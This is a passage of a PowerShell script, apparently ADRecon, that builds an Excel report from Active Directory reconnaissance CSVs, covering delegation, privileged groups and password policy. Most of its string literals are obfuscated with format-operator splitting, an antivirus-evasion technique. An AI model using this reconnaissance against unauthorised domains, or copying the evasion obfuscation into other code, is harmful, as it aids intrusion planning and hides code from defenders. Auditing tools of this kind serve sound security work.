    # https://msdn.microsoft.com/en-us/library/system.runtime.interopservices.marshal.finalreleasecomobject(v=vs.110).aspx
    If ($Final)
    {
        [System.Runtime.InteropServices.Marshal]::FinalReleaseComObject($ComObjtoRelease) | Out-Null
    }
    Else
    {
        [System.Runtime.InteropServices.Marshal]::ReleaseComObject($ComObjtoRelease) | Out-Null
    }
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()
}

Function Get-ADRExcelWorkbook
{
<#
.SYNOPSIS
    Adds a WorkSheet to the Workbook.

.DESCRIPTION
    Adds a WorkSheet to the Workbook using the $workboook global variable and assigns it a name.

.PARAMETER name
    [string]
    Name of the WorkSheet.
#>
    param (
        [Parameter(Mandatory = $true)]
        [string] $name
    )

    $workbook.Worksheets.Add() | Out-Null
    $worksheet = $workbook.Worksheets.Item(1)
    $worksheet.Name = $name

    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable worksheet
}

Function Get-ADRExcelImport
{
<#
.SYNOPSIS
    Helper to import CSV to the current WorkSheet.

.DESCRIPTION
    Helper to import CSV to the current WorkSheet. Supports two methods.

.PARAMETER ADFileName
    [string]
    Filename of the CSV file to import.

.PARAMETER method
    [int]
    Method to use for the import.

.PARAMETER row
    [int]
    Row.

.PARAMETER column
    [int]
    Column.
#>
    param (
        [Parameter(Mandatory = $true)]
        [string] $ADFileName,

        [Parameter(Mandatory = $false)]
        [int] $Method = 1,

        [Parameter(Mandatory = $false)]
        [int] $row = 1,

        [Parameter(Mandatory = $false)]
        [int] $column = 1
    )

    $excel.ScreenUpdating = $false
    If ($Method -eq 1)
    {
        If (Test-Path $ADFileName)
        {
            $worksheet = $workbook.Worksheets.Item(1)
            $TxtConnector = (("{1}{0}" -f'XT;','TE') + $ADFileName)
            $CellRef = $worksheet.Range("A1")
            #Build, use and remove the text file connector
            $Connector = $worksheet.QueryTables.add($TxtConnector, $CellRef)

            #65001: Unicode (UTF-8)
            $worksheet.QueryTables.item($Connector.name).TextFilePlatform = 65001
            $worksheet.QueryTables.item($Connector.name).TextFileCommaDelimiter = $True
            $worksheet.QueryTables.item($Connector.name).TextFileParseType = 1
            $worksheet.QueryTables.item($Connector.name).Refresh() | Out-Null
            $worksheet.QueryTables.item($Connector.name).delete()

            Get-ADRExcelComObjRelease -ComObjtoRelease $CellRef
            Remove-Variable CellRef
            Get-ADRExcelComObjRelease -ComObjtoRelease $Connector
            Remove-Variable Connector

            $listObject = $worksheet.ListObjects.Add([Microsoft.Office.Interop.Excel.XlListObjectSourceType]::xlSrcRange, $worksheet.UsedRange, $null, [Microsoft.Office.Interop.Excel.XlYesNoGuess]::xlYes, $null)
            $listObject.TableStyle = ("{2}{0}{1}{3}"-f 'ableSt','yl','T','eLight2') # Style Cheat Sheet: https://msdn.microsoft.com/en-au/library/documentformat.openxml.spreadsheet.tablestyle.aspx
            $worksheet.UsedRange.EntireColumn.AutoFit() | Out-Null
        }
        Remove-Variable ADFileName
    }
    Elseif ($Method -eq 2)
    {
        $worksheet = $workbook.Worksheets.Item(1)
        If (Test-Path $ADFileName)
        {
            $ADTemp = Import-Csv -Path $ADFileName
            $ADTemp | ForEach-Object {
                Foreach ($prop in $_.PSObject.Properties)
                {
                    $worksheet.Cells.Item($row, $column) = $prop.Name
                    $worksheet.Cells.Item($row, $column + 1) = $prop.Value
                    $row++
                }
            }
            Remove-Variable ADTemp
            $listObject = $worksheet.ListObjects.Add([Microsoft.Office.Interop.Excel.XlListObjectSourceType]::xlSrcRange, $worksheet.UsedRange, $null, [Microsoft.Office.Interop.Excel.XlYesNoGuess]::xlYes, $null)
            $listObject.TableStyle = ("{1}{4}{3}{0}{2}"-f'tyleLight','Tab','2','eS','l') # Style Cheat Sheet: https://msdn.microsoft.com/en-au/library/documentformat.openxml.spreadsheet.tablestyle.aspx
            $usedRange = $worksheet.UsedRange
            $usedRange.EntireColumn.AutoFit() | Out-Null
        }
        Else
        {
            $worksheet.Cells.Item($row, $column) = ("{1}{0}"-f 'r!','Erro')
        }
        Remove-Variable ADFileName
    }
    $excel.ScreenUpdating = $true

    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable worksheet
}

# Thanks Anant Shrivastava for the suggestion of using Pivot Tables for generation of the Stats sheets.
Function Get-ADRExcelPivotTable
{
<#
.SYNOPSIS
    Helper to add Pivot Table to the current WorkSheet.

.DESCRIPTION
    Helper to add Pivot Table to the current WorkSheet.

.PARAMETER SrcSheetName
    [string]
    Source Sheet Name.

.PARAMETER PivotTableName
    [string]
    Pivot Table Name.

.PARAMETER PivotRows
    [array]
    Row names from Source Sheet.

.PARAMETER PivotColumns
    [array]
    Column names from Source Sheet.

.PARAMETER PivotFilters
    [array]
    Row/Column names from Source Sheet to use as filters.

.PARAMETER PivotValues
    [array]
    Row/Column names from Source Sheet to use for Values.

.PARAMETER PivotPercentage
    [array]
    Row/Column names from Source Sheet to use for Percentage.

.PARAMETER PivotLocation
    [array]
    Location of the Pivot Table in Row/Column.
#>
    param (
        [Parameter(Mandatory = $true)]
        [string] $SrcSheetName,

        [Parameter(Mandatory = $true)]
        [string] $PivotTableName,

        [Parameter(Mandatory = $false)]
        [array] $PivotRows,

        [Parameter(Mandatory = $false)]
        [array] $PivotColumns,

        [Parameter(Mandatory = $false)]
        [array] $PivotFilters,

        [Parameter(Mandatory = $false)]
        [array] $PivotValues,

        [Parameter(Mandatory = $false)]
        [array] $PivotPercentage,

        [Parameter(Mandatory = $false)]
        [string] $PivotLocation = ("{0}{1}" -f'R1C','1')
    )

    $excel.ScreenUpdating = $false
    $SrcWorksheet = $workbook.Sheets.Item($SrcSheetName)
    $workbook.ShowPivotTableFieldList = $false

    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlpivottablesourcetype-enumeration-excel
    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlpivottableversionlist-enumeration-excel
    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlpivotfieldorientation-enumeration-excel
    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/constants-enumeration-excel
    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlsortorder-enumeration-excel
    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlpivotfiltertype-enumeration-excel

    # xlDatabase = 1 # this just means local sheet data
    # xlPivotTableVersion12 = 3 # Excel 2007
    $PivotFailed = $false
    Try
    {
        $PivotCaches = $workbook.PivotCaches().Create([Microsoft.Office.Interop.Excel.XlPivotTableSourceType]::xlDatabase, $SrcWorksheet.UsedRange, [Microsoft.Office.Interop.Excel.XlPivotTableVersionList]::xlPivotTableVersion12)
    }
    Catch
    {
        $PivotFailed = $true
        Write-Verbose ("{7}{1}{4}{5}{6}{3}{2}{8}{0}" -f'ed','v','ate] Fai','Cre','otCa','ches()','.','[Pi','l')
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
    }
    If ( $PivotFailed -eq $true )
    {
        $rows = $SrcWorksheet.UsedRange.Rows.Count
        If ($SrcSheetName -eq ("{2}{1}{0}" -f'PNs','mputer S','Co'))
        {
            $PivotCols = ("{1}{0}" -f'1:C','A')
        }
        ElseIf ($SrcSheetName -eq ("{1}{0}{2}"-f'p','Com','uters'))
        {
            $PivotCols = ("{0}{1}"-f'A','1:F')
        }
        ElseIf ($SrcSheetName -eq ("{0}{1}"-f 'Use','rs'))
        {
            $PivotCols = ("{0}{1}"-f'A1',':C')
        }
        $UsedRange = $SrcWorksheet.Range($PivotCols+$rows)
        $PivotCaches = $workbook.PivotCaches().Create([Microsoft.Office.Interop.Excel.XlPivotTableSourceType]::xlDatabase, $UsedRange, [Microsoft.Office.Interop.Excel.XlPivotTableVersionList]::xlPivotTableVersion12)
        Remove-Variable rows
	    Remove-Variable PivotCols
        Remove-Variable UsedRange
    }
    Remove-Variable PivotFailed
    $PivotTable = $PivotCaches.CreatePivotTable($PivotLocation,$PivotTableName)
    # $workbook.ShowPivotTableFieldList = $true

    If ($PivotRows)
    {
        ForEach ($Row in $PivotRows)
        {
            $PivotField = $PivotTable.PivotFields($Row)
            $PivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlRowField
        }
    }

    If ($PivotColumns)
    {
        ForEach ($Col in $PivotColumns)
        {
            $PivotField = $PivotTable.PivotFields($Col)
            $PivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlColumnField
        }
    }

    If ($PivotFilters)
    {
        ForEach ($Fil in $PivotFilters)
        {
            $PivotField = $PivotTable.PivotFields($Fil)
            $PivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlPageField
        }
    }

    If ($PivotValues)
    {
        ForEach ($Val in $PivotValues)
        {
            $PivotField = $PivotTable.PivotFields($Val)
            $PivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlDataField
        }
    }

    If ($PivotPercentage)
    {
        ForEach ($Val in $PivotPercentage)
        {
            $PivotField = $PivotTable.PivotFields($Val)
            $PivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlDataField
            $PivotField.Calculation = [Microsoft.Office.Interop.Excel.XlPivotFieldCalculation]::xlPercentOfTotal
            $PivotTable.ShowValuesRow = $false
        }
    }

    # $PivotFields.Caption = ""
    $excel.ScreenUpdating = $true

    Get-ADRExcelComObjRelease -ComObjtoRelease $PivotField
    Remove-Variable PivotField
    Get-ADRExcelComObjRelease -ComObjtoRelease $PivotTable
    Remove-Variable PivotTable
    Get-ADRExcelComObjRelease -ComObjtoRelease $PivotCaches
    Remove-Variable PivotCaches
    Get-ADRExcelComObjRelease -ComObjtoRelease $SrcWorksheet
    Remove-Variable SrcWorksheet
}

Function Get-ADRExcelAttributeStats
{
<#
.SYNOPSIS
    Helper to add Attribute Stats to the current WorkSheet.

.DESCRIPTION
    Helper to add Attribute Stats to the current WorkSheet.

.PARAMETER SrcSheetName
    [string]
    Source Sheet Name.

.PARAMETER Title1
    [string]
    Title1.

.PARAMETER PivotTableName
    [string]
    PivotTableName.

.PARAMETER PivotRows
    [string]
    PivotRows.

.PARAMETER PivotValues
    [string]
    PivotValues.

.PARAMETER PivotPercentage
    [string]
    PivotPercentage.

.PARAMETER Title2
    [string]
    Title2.

.PARAMETER ObjAttributes
    [OrderedDictionary]
    Attributes.
#>
    param (
        [Parameter(Mandatory = $true)]
        [string] $SrcSheetName,

        [Parameter(Mandatory = $true)]
        [string] $Title1,

        [Parameter(Mandatory = $true)]
        [string] $PivotTableName,

        [Parameter(Mandatory = $true)]
        [string] $PivotRows,

        [Parameter(Mandatory = $true)]
        [string] $PivotValues,

        [Parameter(Mandatory = $true)]
        [string] $PivotPercentage,

        [Parameter(Mandatory = $true)]
        [string] $Title2,

        [Parameter(Mandatory = $true)]
        [System.Object] $ObjAttributes
    )

    $excel.ScreenUpdating = $false
    $worksheet = $workbook.Worksheets.Item(1)
    $SrcWorksheet = $workbook.Sheets.Item($SrcSheetName)

    $row = 1
    $column = 1
    $worksheet.Cells.Item($row, $column) = $Title1
    $worksheet.Cells.Item($row,$column).Style = ("{1}{2}{0}"-f'ng 2','H','eadi')
    $worksheet.Cells.Item($row,$column).HorizontalAlignment = -4108
    $MergeCells = $worksheet.Range(("{1}{0}"-f'C1','A1:'))
    $MergeCells.Select() | Out-Null
    $MergeCells.MergeCells = $true
    Remove-Variable MergeCells

    Get-ADRExcelPivotTable -SrcSheetName $SrcSheetName -PivotTableName $PivotTableName -PivotRows @($PivotRows) -PivotValues @($PivotValues) -PivotPercentage @($PivotPercentage) -PivotLocation ("{1}{0}"-f'1','R2C')
    $excel.ScreenUpdating = $false

    $row = 2
    ("{1}{0}" -f'pe','Ty'),("{1}{0}" -f 't','Coun'),("{1}{2}{0}"-f'ge','Perce','nta') | ForEach-Object {
        $worksheet.Cells.Item($row, $column) = $_
        $worksheet.Cells.Item($row, $column).Font.Bold = $True
        $column++
    }

    $row = 3
    $column = 1
    For($row = 3; $row -le 6; $row++)
    {
        $temptext = [string] $worksheet.Cells.Item($row, $column).Text
        switch ($temptext.ToUpper())
        {
            ("{1}{0}" -f 'RUE','T') { $worksheet.Cells.Item($row, $column) = ("{1}{0}" -f 'd','Enable') }
            ("{1}{0}" -f 'SE','FAL') { $worksheet.Cells.Item($row, $column) = ("{0}{1}" -f 'Di','sabled') }
            ("{0}{3}{2}{1}"-f 'GRA','TAL',' TO','ND') { $worksheet.Cells.Item($row, $column) = ("{1}{0}"-f 'tal','To') }
        }
    }

    If ($ObjAttributes)
    {
        $row = 1
        $column = 6
        $worksheet.Cells.Item($row, $column) = $Title2
        $worksheet.Cells.Item($row,$column).Style = ("{2}{0}{1}" -f ' ','2','Heading')
        $worksheet.Cells.Item($row,$column).HorizontalAlignment = -4108
        $MergeCells = $worksheet.Range(("{1}{0}"-f '1:L1','F'))
        $MergeCells.Select() | Out-Null
        $MergeCells.MergeCells = $true
        Remove-Variable MergeCells

        $row++
        ("{1}{0}"-f 'ory','Categ'),("{3}{2}{0}{1}"-f 'Coun','t','d ','Enable'),("{3}{0}{5}{2}{4}{1}"-f 'bl','age',' P','Ena','ercent','ed'),("{1}{0}{2}" -f 'led C','Disab','ount'),("{0}{4}{1}{2}{3}"-f'Di',' Per','centag','e','sabled'),("{2}{1}{0}{3}" -f 'Cou','otal ','T','nt'),("{4}{2}{0}{3}{1}" -f 'erc','e','al P','entag','Tot') | ForEach-Object {
            $worksheet.Cells.Item($row, $column) = $_
            $worksheet.Cells.Item($row, $column).Font.Bold = $True
            $column++
        }
        $ExcelColumn = ($SrcWorksheet.Columns.Find(("{1}{0}"-f'abled','En')))
        $EnabledColAddress = "$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1)):$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1))"
        $column = 6
        $i = 2

        $ObjAttributes.keys | ForEach-Object {
            $ExcelColumn = ($SrcWorksheet.Columns.Find($_))
            $ColAddress = "$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1)):$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1))"
            $row++
            $i++
            If ($_ -eq ("{1}{0}{3}{2}" -f 'ation T','Deleg','p','y'))
            {
                $worksheet.Cells.Item($row, $column) = ("{3}{0}{4}{5}{6}{1}{2}" -f'nco','gati','on','U','n','s','trained Dele')
            }
            ElseIf ($_ -eq ("{0}{3}{1}{2}"-f'Dele','Typ','e','gation '))
            {
                $worksheet.Cells.Item($row, $column) = ("{1}{2}{3}{0}"-f 'egation','Cons','tr','ained Del')
            }
            Else
            {
                $worksheet.Cells.Item($row, $column).Formula = "='" + $SrcWorksheet.Name + "'!" + $ExcelColumn.Address($false,$false)
            }
            $worksheet.Cells.Item($row, $column+1).Formula = (((("{2}{0}{3}{1}"-f 'IFS(U','I','=COUNT','e'))-creplace  'UeI',[ChaR]39)) + $SrcWorksheet.Name + "'!" + $EnabledColAddress + ((("{1}{3}{2}{0}"-f'PE,',',GP','TRUEG','E'))-rePLACe ([cHar]71+[cHar]80+[cHar]69),[cHar]34) + "'" + $SrcWorksheet.Name + "'!" + $ColAddress + ',' + $ObjAttributes[$_] + ')'
            $worksheet.Cells.Item($row, $column+2).Formula = ((("{0}{3}{2}{1}"-f '=I','(G','ERROR','F'))) + $i + (((("{4}{0}{5}{1}{7}{6}{2}{3}" -f 'LOOKUP(8','E','FALSE),','0)','/V','Qm','bled8Qm,A3:B6,2,','na'))  -crePLACE  ([cHar]56+[cHar]81+[cHar]109),[cHar]34))
            $worksheet.Cells.Item($row, $column+3).Formula = ((("{3}{2}{4}{0}{1}"-f 'S(uo','1','CO','=','UNTIF')).rEPLACE('uo1',[striNG][cHar]39)) + $SrcWorksheet.Name + "'!" + $EnabledColAddress + ((("{2}{0}{1}" -f'LSE','{0},',',{0}FA')) -F  [cHAR]34) + "'" + $SrcWorksheet.Name + "'!" + $ColAddress + ',' + $ObjAttributes[$_] + ')'
            $worksheet.Cells.Item($row, $column+4).Formula = ((("{0}{2}{1}"-f '=IFERROR','I','('))) + $i + (((("{8}{0}{1}{10}{4}{9}{3}{5}{2}{7}{6}"-f'{0','}Disabled{0},','SE',',F','6,','AL','0)','),','/VLOOKUP(','2','A3:B')) -F  [cHar]34))
            If ( ($_ -eq ("{2}{0}{1}" -f 'DHist','ory','SI')) -or ($_ -eq ("{3}{2}{5}{4}{1}{0}" -f'd','rSi','-d','ms','Creato','s-')) )
            {
                # Remove count of FieldName
                $worksheet.Cells.Item($row, $column+5).Formula = (((("{1}{2}{0}" -f '0}','=COUNTIF','({'))  -f  [Char]39)) + $SrcWorksheet.Name + "'!" + $ColAddress + ',' + $ObjAttributes[$_] + ')-1'
            }
            Else
            {
                $worksheet.Cells.Item($row, $column+5).Formula = ((("{2}{0}{1}"-f'(e','5o','=COUNTIF')).RePlACe(([cHAr]101+[cHAr]53+[cHAr]111),[StrIng][cHAr]39)) + $SrcWorksheet.Name + "'!" + $ColAddress + ',' + $ObjAttributes[$_] + ')'
            }
            $worksheet.Cells.Item($row, $column+6).Formula = ((("{0}{2}{1}" -f '=','RROR(K','IFE'))) + $i + (((("{0}{7}{4}{3}{6}{1}{5}{8}{2}" -f '/VL',',A',')','(b0rT','OKUP','3','otalb0r','O',':B6,2,FALSE),0')) -rEplaCe([cHaR]98+[cHaR]48+[cHaR]114),[cHaR]34))
        }

        # http://www.excelhowto.com/macros/formatting-a-range-of-cells-in-excel-vba/
        "H", "J" , "L" | ForEach-Object {
            $rng = $_ + $($row - $ObjAttributes.Count + 1) + ":" + $_ + $($row)
            $worksheet.Range($rng).NumberFormat = ("{0}{1}"-f '0','.00%')
        }
    }
    $excel.ScreenUpdating = $true

    Get-ADRExcelComObjRelease -ComObjtoRelease $SrcWorksheet
    Remove-Variable SrcWorksheet
    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable worksheet
}

Function Get-ADRExcelChart
{
<#
.SYNOPSIS
    Helper to add charts to the current WorkSheet.

.DESCRIPTION
    Helper to add charts to the current WorkSheet.

.PARAMETER ChartType
    [int]
    Chart Type.

.PARAMETER ChartLayout
    [int]
    Chart Layout.

.PARAMETER ChartTitle
    [string]
    Title of the Chart.

.PARAMETER RangetoCover
    WorkSheet Range to be covered by the Chart.

.PARAMETER ChartData
    Data for the Chart.

.PARAMETER StartRow
    Start row to calculate data for the Chart.

.PARAMETER StartColumn
    Start column to calculate data for the Chart.
#>
    param (
        [Parameter(Mandatory = $true)]
        [string] $ChartType,

        [Parameter(Mandatory = $true)]
        [int] $ChartLayout,

        [Parameter(Mandatory = $true)]
        [string] $ChartTitle,

        [Parameter(Mandatory = $true)]
        $RangetoCover,

        [Parameter(Mandatory = $false)]
        $ChartData = $null,

        [Parameter(Mandatory = $false)]
        $StartRow = $null,

        [Parameter(Mandatory = $false)]
        $StartColumn = $null
    )

    $excel.ScreenUpdating = $false
    $excel.DisplayAlerts = $false
    $worksheet = $workbook.Worksheets.Item(1)
    $chart = $worksheet.Shapes.AddChart().Chart
    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlcharttype-enumeration-excel
    $chart.chartType = [int]([Microsoft.Office.Interop.Excel.XLChartType]::$ChartType)
    $chart.ApplyLayout($ChartLayout)
    If ($null -eq $ChartData)
    {
        If ($null -eq $StartRow)
        {
            $start = $worksheet.Range("A1")
        }
        Else
        {
            $start = $worksheet.Range($StartRow)
        }
        # get the last cell
        $X = $worksheet.Range($start,$start.End([Microsoft.Office.Interop.Excel.XLDirection]::xlDown))
        If ($null -eq $StartColumn)
        {
            $start = $worksheet.Range("B1")
        }
        Else
        {
            $start = $worksheet.Range($StartColumn)
        }
        # get the last cell
        $Y = $worksheet.Range($start,$start.End([Microsoft.Office.Interop.Excel.XLDirection]::xlDown))
        $ChartData = $worksheet.Range($X,$Y)

        Get-ADRExcelComObjRelease -ComObjtoRelease $X
        Remove-Variable X
        Get-ADRExcelComObjRelease -ComObjtoRelease $Y
        Remove-Variable Y
        Get-ADRExcelComObjRelease -ComObjtoRelease $start
        Remove-Variable start
    }
    $chart.SetSourceData($ChartData)
    # https://docs.microsoft.com/en-us/dotnet/api/microsoft.office.interop.excel.chartclass.plotby?redirectedfrom=MSDN&view=excel-pia#Microsoft_Office_Interop_Excel_ChartClass_PlotBy
    $chart.PlotBy = [Microsoft.Office.Interop.Excel.XlRowCol]::xlColumns
    $chart.seriesCollection(1).Select() | Out-Null
    $chart.SeriesCollection(1).ApplyDataLabels() | out-Null
    # modify the chart title
    $chart.HasTitle = $True
    $chart.ChartTitle.Text = $ChartTitle
    # Reposition the Chart
    $temp = $worksheet.Range($RangetoCover)
    # $chart.parent.placement = 3
    $chart.parent.top = $temp.Top
    $chart.parent.left = $temp.Left
    $chart.parent.width = $temp.Width
    If ($ChartTitle -ne ("{0}{6}{2}{7}{3}{5}{4}{1}" -f 'Privi','ups in AD','eg','d','o',' Gr','l','e'))
    {
        $chart.parent.height = $temp.Height
    }
    # $chart.Legend.Delete()
    $excel.ScreenUpdating = $true
    $excel.DisplayAlerts = $true

    Get-ADRExcelComObjRelease -ComObjtoRelease $chart
    Remove-Variable chart
    Get-ADRExcelComObjRelease -ComObjtoRelease $ChartData
    Remove-Variable ChartData
    Get-ADRExcelComObjRelease -ComObjtoRelease $temp
    Remove-Variable temp
    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable worksheet
}

Function Get-ADRExcelSort
{
<#
.SYNOPSIS
    Sorts a WorkSheet in the active Workbook.

.DESCRIPTION
    Sorts a WorkSheet in the active Workbook.

.PARAMETER ColumnName
    [string]
    Name of the Column.
#>
    param (
        [Parameter(Mandatory = $true)]
        [string] $ColumnName
    )

    $worksheet = $workbook.Worksheets.Item(1)
    $worksheet.Activate();

    $ExcelColumn = ($worksheet.Columns.Find($ColumnName))
    If ($ExcelColumn)
    {
        If ($ExcelColumn.Text -ne $ColumnName)
        {
            $BeginAddress = $ExcelColumn.Address(0,0,1,1)
            $End = $False
            Do {
                #Write-Verbose "[Get-ADRExcelSort] $($ExcelColumn.Text) selected instead of $($ColumnName) in the $($worksheet.Name) worksheet."
                $ExcelColumn = ($worksheet.Columns.FindNext($ExcelColumn))
                $Address = $ExcelColumn.Address(0,0,1,1)
                If ( ($Address -eq $BeginAddress) -or ($ExcelColumn.Text -eq $ColumnName) )
                {
                    $End = $True
                }
            } Until ($End -eq $True)
        }
        If ($ExcelColumn.Text -eq $ColumnName)
        {
            # Sort by Column
            $workSheet.ListObjects.Item(1).Sort.SortFields.Clear()
            $workSheet.ListObjects.Item(1).Sort.SortFields.Add($ExcelColumn) | Out-Null
            $worksheet.ListObjects.Item(1).Sort.Apply()
        }
        Else
        {
            Write-Verbose "[Get-ADRExcelSort] $($ColumnName) not found in the $($worksheet.Name) worksheet. "
        }
    }
    Else
    {
        Write-Verbose "[Get-ADRExcelSort] $($ColumnName) not found in the $($worksheet.Name) worksheet. "
    }
    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable worksheet
}

Function Export-ADRExcel
{
<#
.SYNOPSIS
    Automates the generation of the ADRecon report.

.DESCRIPTION
    Automates the generation of the ADRecon report. If specific files exist, they are imported into the ADRecon report.

.PARAMETER ExcelPath
    [string]
    Path for ADRecon output folder containing the CSV files to generate the ADRecon-Report.xlsx

.OUTPUTS
    Creates the ADRecon-Report.xlsx report in the folder.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $ExcelPath
    )

    $ExcelPath = $((Convert-Path $ExcelPath).TrimEnd("\"))
    $ReportPath = -join($ExcelPath,'\',("{0}{1}" -f 'CSV-File','s'))
    If (!(Test-Path $ReportPath))
    {
        Write-Warning ("{7}{15}{2}{1}{6}{8}{5}{14}{0}{4}{16}{9}{11}{10}{3}{12}{13}"-f 'V-','ADR','port-','Exi','Files ','t l','Excel] Could','[E',' no','ecto','.. ','ry .','tin','g','ocate the CS','x','dir')
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        Return $null
    }
    Get-ADRExcelComObj
    If ($excel)
    {
        Write-Output ("{4}{3}{8}{2}{0}{5}{6}{1}{7}" -f'econ-','xl','ng ADR','er','[*] Gen','Rep','ort.','sx','ati')

        $ADFileName = -join($ReportPath,'\',("{0}{2}{4}{1}{3}"-f'About','n.c','ADRe','sv','co'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            $workbook.Worksheets.Item(1).Name = ("{2}{1}{0}"-f'econ','out ADR','Ab')
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(3,2) , ("{4}{8}{2}{6}{7}{3}{1}{0}{5}" -f 'o','c','s://gi','Re','htt','n','t','hub.com/adrecon/AD','p'), "" , "", ("{7}{3}{5}{1}{4}{6}{0}{2}" -f'/','o','ADRecon','t','m/adreco','hub.c','n','gi')) | Out-Null
            $workbook.Worksheets.Item(1).UsedRange.EntireColumn.AutoFit() | Out-Null
        }

        $ADFileName = -join($ReportPath,'\',("{0}{1}{2}" -f'Fo','rest','.csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{1}"-f'F','orest')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{1}{0}{2}" -f'c','Domain.','sv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{2}{1}{0}" -f'ain','om','D')
            Get-ADRExcelImport -ADFileName $ADFileName
            $DomainObj = Import-CSV -Path $ADFileName
            Remove-Variable ADFileName
            $DomainName = -join($DomainObj[0].Value,"-")
            Remove-Variable DomainObj
        }

        $ADFileName = -join($ReportPath,'\',("{3}{0}{1}{2}" -f 'ts','.cs','v','Trus'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{2}{1}{0}" -f'sts','ru','T')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{0}{2}{1}{3}"-f'Subne','.c','ts','sv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{1}{0}{2}" -f'net','Sub','s')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{0}{1}{2}" -f'S','it','es.csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{1}" -f 'S','ites')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{0}{1}{3}{5}{2}{4}" -f 'S','chema','.c','Hist','sv','ory'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{4}{2}{1}{3}{0}" -f'ry','His','a','to','Schem')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{1}{2}{0}{3}{4}" -f 'ainedPasswordPo','Fine','Gr','li','cy.csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{4}{2}{1}{0}{3}"-f'd P','Passwor','ine Grained ','olicy','F')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{4}{1}{2}{5}{3}{0}" -f 'csv','swo','rd','licy.','DefaultPas','Po'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{4}{3}{2}{0}{1}" -f'd Poli','cy','swor','fault Pas','De')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            $excel.ScreenUpdating = $false
            $worksheet = $workbook.Worksheets.Item(1)
            # https://docs.microsoft.com/en-us/office/vba/api/excel.xlhalign
            $worksheet.Range(("{1}{0}"-f '0','B2:G1')).HorizontalAlignment = -4108
            # https://docs.microsoft.com/en-us/office/vba/api/excel.range.borderaround

            ("{0}{1}"-f'A2:B','10'), ("{0}{1}" -f 'C2:','D10'), ("{1}{0}" -f'2:F10','E'), ("{0}{1}{2}"-f'G2:G','1','0') | ForEach-Object {
                $worksheet.Range($_).BorderAround(1) | Out-Null
            }

            # https://docs.microsoft.com/en-us/dotnet/api/microsoft.office.interop.excel.formatconditions.add?view=excel-pia
            # $worksheet.Range().FormatConditions.Add
            # http://dmcritchie.mvps.org/excel/colors.htm
            # Values for Font.ColorIndex

            $ObjValues = @(
            # PCI Enforce password history (passwords)
            "C2", ("{1}{0}{3}{5}{4}{2}" -f '(','=IF','SE)','B','FAL','2<4,TRUE, ')

            # PCI Maximum password age (days)
            "C3", ("{4}{1}{0}{5}{3}{2}" -f '(B3=0,','F(OR','LSE)','TRUE, FA','=I','B3>90),')

            # PCI Minimum password age (days)

            # PCI Minimum password length (characters)
            "C5", (("{4}{1}{3}{5}{6}{2}{0}"-f 'ALSE)','IF','RUE, F','(','=','B5<7,','T'))

            # PCI Password must meet complexity requirements
            "C6", (("{4}{0}{2}{1}{3}"-f'B6<>TRUE,',', F','TRUE','ALSE)','=IF('))

            # PCI Store password using reversible encryption for all users in the domain

            # PCI Account lockout duration (mins)
            "C8", ((("{1}{7}{5}{2}{6}{3}{0}{4}"-f'),TR','=IF',',B8','0','UE, FALSE)','ND(B8>=1','<3','(A')))

            # PCI Account lockout threshold (attempts)
            "C9", ("{2}{3}{1}{0}{4}{5}" -f '(B9=0,B9>','F(OR','=','I','6),','TRUE, FALSE)')

            # PCI Reset account lockout counter after (mins)

